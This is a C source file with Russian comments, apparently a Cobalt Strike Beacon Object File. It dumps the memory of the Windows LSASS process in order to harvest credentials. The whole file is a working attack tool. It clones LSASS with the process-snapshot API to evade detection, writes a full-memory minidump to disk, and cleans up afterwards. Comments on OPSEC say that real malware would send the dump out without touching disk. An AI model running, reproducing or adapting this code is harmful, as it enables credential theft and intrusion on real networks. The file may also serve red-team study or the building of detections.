#include <windows.h>
#include "beacon.h"

// --- СТРУКТУРЫ PSS (Process Snapshotting) ---
// Объявляем их вручную, так как в старых версиях MinGW-w64 они могут отсутствовать.
typedef void* HPSS;
#define PSS_CAPTURE_VA_CLONE 0x00000001

typedef enum {
    PSS_QUERY_VA_CLONE_INFORMATION = 1
} PSS_QUERY_INFORMATION_CLASS;

typedef struct {
    HANDLE VaCloneHandle;
} PSS_VA_CLONE_INFORMATION;

typedef enum _MINIDUMP_TYPE {
    MiniDumpWithFullMemory = 0x00000002
} MINIDUMP_TYPE;

// --- СТРОГИЕ ИМПОРТЫ СИСТЕМНЫХ API (Формат DLL$Function) ---
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL   WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$GetLastError(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);

DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssCaptureSnapshot(HANDLE, DWORD, DWORD, HPSS*);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssQuerySnapshot(HPSS, PSS_QUERY_INFORMATION_CLASS, void*, DWORD);
DECLSPEC_IMPORT DWORD  WINAPI KERNEL32$PssFreeSnapshot(HANDLE, HPSS);

// Обрати внимание: Мы загружаем MiniDumpWriteDump из dbghelp.dll. 
// Твой лоадер (ResolveSystemApi) автоматически подгрузит эту библиотеку!
DECLSPEC_IMPORT BOOL   WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, DWORD, HANDLE, MINIDUMP_TYPE, void*, void*, void*);


void go(char* args, int len) {
    datap parser;
    int target_pid = 0;

    // 1. Инициализируем парсер и читаем PID LSASS, переданный лоадером (-p PID)
    BeaconDataParse(&parser, args, len);
    target_pid = BeaconDataInt(&parser);

    if (target_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "LSASS PID is required. Run loader with: -p <PID>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LSASS PID: %d. Initiating PssCaptureSnapshot...", target_pid);

    // 2. OPSEC: Открываем LSASS. 
    // В идеале нужно запрашивать минимальные права (PROCESS_CREATE_PROCESS | PROCESS_VM_READ),
    // но для уверенной работы PSS в демо оставим PROCESS_ALL_ACCESS. Требуется SeDebugPrivilege!
    // PROCESS_CREATE_PROCESS нужен для клонирования, VM_READ для памяти
	DWORD dwRights = PROCESS_CREATE_PROCESS | PROCESS_QUERY_INFORMATION | PROCESS_VM_READ;
	HANDLE hLsass = KERNEL32$OpenProcess(dwRights, FALSE, target_pid);
    if (!hLsass) {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcess on LSASS failed. Error: %lu", KERNEL32$GetLastError());
        return;
    }

    // 3. Создаем теневой клон (Snapshot) процесса LSASS
    HPSS hSnapshot = NULL;
    DWORD pssStatus = KERNEL32$PssCaptureSnapshot(hLsass, PSS_CAPTURE_VA_CLONE, 0, &hSnapshot);
    if (pssStatus != ERROR_SUCCESS || !hSnapshot) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PssCaptureSnapshot failed. Error: %lu", pssStatus);
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Snapshot captured successfully. Extracting clone handle...");

    // 4. Запрашиваем HANDLE клонированного процесса из нашего Snapshot'а
    PSS_VA_CLONE_INFORMATION cloneInfo = { 0 };
    pssStatus = KERNEL32$PssQuerySnapshot(hSnapshot, PSS_QUERY_VA_CLONE_INFORMATION, &cloneInfo, sizeof(cloneInfo));
    
    if (pssStatus != ERROR_SUCCESS || !cloneInfo.VaCloneHandle) {
        BeaconPrintf(CALLBACK_ERROR, "[-] PssQuerySnapshot failed. Error: %lu", pssStatus);
        KERNEL32$PssFreeSnapshot(KERNEL32$GetCurrentProcess(), hSnapshot);
        KERNEL32$CloseHandle(hLsass);
        return;
    }

    // 5. Создаем файл на диске для дампа.
    // (В реальной малвари мы бы читали память клона напрямую и отправляли по сети без касания диска).
    const char* dumpPath = "lsass_snapshot.dmp";
    HANDLE hFile = KERNEL32$CreateFileA(dumpPath, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to create dump file. Error: %lu", KERNEL32$GetLastError());
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Writing Full Memory Dump to %s...", dumpPath);

        // 6. Дампим КЛОН, а не настоящий LSASS!
        BOOL dumpSuccess = DBGHELP$MiniDumpWriteDump(
            cloneInfo.VaCloneHandle, 
            target_pid, // PID может быть оригинальным, это нужно просто для заголовка файла
            hFile, 
            MiniDumpWithFullMemory, 
            NULL, NULL, NULL
        );

        if (dumpSuccess) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! LSASS dump written via Snapshotting evasion.");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] MiniDumpWriteDump failed. Error: %lu", KERNEL32$GetLastError());
        }

        KERNEL32$CloseHandle(hFile);
    }

    // 7. OPSEC: Убираем за собой. Освобождение Snapshot'а уничтожает скрытый клон.
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Freeing snapshot and cleaning up...");
    KERNEL32$PssFreeSnapshot(KERNEL32$GetCurrentProcess(), hSnapshot);
    KERNEL32$CloseHandle(hLsass);
}